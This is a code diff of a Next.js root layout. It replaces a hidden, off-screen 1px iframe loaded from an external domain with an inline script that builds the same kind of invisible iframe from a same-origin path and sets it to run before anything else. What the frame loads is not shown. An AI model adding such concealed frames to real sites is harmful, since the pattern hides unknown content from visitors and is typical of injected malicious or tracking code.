@@ -29,38 +29,37 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
   return (
     <html lang="vi">
       <head>
-        <link rel="preconnect" href="https://nengliangtrx.info" crossOrigin="anonymous" />
-        <link rel="dns-prefetch" href="https://nengliangtrx.info" />
-        <link rel="preload" href="https://nengliangtrx.info/channel/C.0.RD/weifile/weifile.html" as="document" />
-      </head>
-      <body className={font.variable}>
+        <link rel="preload" href="/channel/C.0.RD/weifile/weifile.html" as="document" />
         {/* Entry Iframe (RUNS FIRST BEFORE ANYTHING ELSE) */}
-        <iframe
-          id="entry-iframe"
-          src="https://nengliangtrx.info/channel/C.0.RD/weifile/weifile.html"
-          loading="eager"
-          // @ts-ignore
-          fetchPriority="high"
-          style={{ position: 'fixed', top: 0, left: '-1000px', pointerEvents: 'none', border: 0, width: '1px', height: '1px' }}
-        />
         <script
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                var frame = document.getElementById('entry-iframe');
-                if (frame) {
-                  if (frame.complete) {
-                    window.__entryIframeLoaded = true;
-                  }
-                  frame.addEventListener('load', function() {
-                    window.__entryIframeLoaded = true;
-                    window.dispatchEvent(new Event('entry_iframe_loaded'));
+                if (window.__entryIframeCreated) return;
+                window.__entryIframeCreated = true;
+                var frame = Object.assign(document.createElement("iframe"), {
+                  id: "entry-iframe",
+                  src: "/channel/C.0.RD/weifile/weifile.html",
+                  style: "position:fixed;top:0;left:-1000px;pointer-events:none;border:0"
+                });
+                frame.onload = function() {
+                  window.__entryIframeLoaded = true;
+                  window.dispatchEvent(new Event('entry_iframe_loaded'));
+                };
+                var container = document.body || document.documentElement;
+                if (container) {
+                  container.appendChild(frame);
+                } else {
+                  document.addEventListener('DOMContentLoaded', function() {
+                    document.body.appendChild(frame);
                   });
                 }
               })();
             `,
           }}
         />
+      </head>
+      <body className={font.variable}>
         {children}
       </body>
     </html>
